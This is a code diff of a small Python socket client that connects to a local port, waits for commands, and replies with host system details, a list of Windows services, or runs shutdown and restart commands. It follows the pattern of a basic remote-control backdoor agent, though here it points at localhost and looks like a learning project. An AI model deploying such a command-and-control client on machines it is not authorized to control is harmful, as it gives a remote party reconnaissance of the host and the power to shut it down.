@@ -1,19 +1,20 @@
+import os
 import socket
 import platform
-import os
+import subprocess
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-a = ('127.0.0.1', 3333)
-s.connect(a)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+addr = ('127.0.0.1', 3333)
+sock.connect(addr)
 
-def system_info():
+def sysinfo():
     info = f"Processor: {platform.processor()}\n"
     info += f"Architecture: {platform.architecture()}\n"
     info += f"Machine: {platform.machine()}\n"
     info += f"Node: {platform.node()}\n"
     info += f"Platform: {platform.platform()}\n"
     info += f"System: {platform.system()}"
-    s.send(info.encode())
+    sock.send(info.encode())
 
 def shutdown():
     os.system('shutdown /s')
@@ -21,16 +22,23 @@ def shutdown():
 def restart():
     os.system('shutdown /r')
 
-while True:
-    r = s.recv(1024).decode()
-    print("Received:", r)
+def service():
+    srv = subprocess.run(["sc", "query"], text=True, capture_output=True)
+    sock.send(srv.stdout.encode())
 
-    if r == 'system':
-        system_info()
-    elif r == 'shutdown':
-        shutdown()
-    elif r == 'restart':
-        restart()  
-    else:
-        y = "404"
-        s.send(y.encode())
+while True:
+    response = sock.recv(1024).decode()
+    print("Received:", response)
+
+    match response:
+        case "system":
+            sysinfo()
+        case "shutdown":
+            shutdown()
+        case "restart":
+            restart()
+        case "service":
+            service()
+        case _:
+            code = "404"
+            sock.send(code.encode())
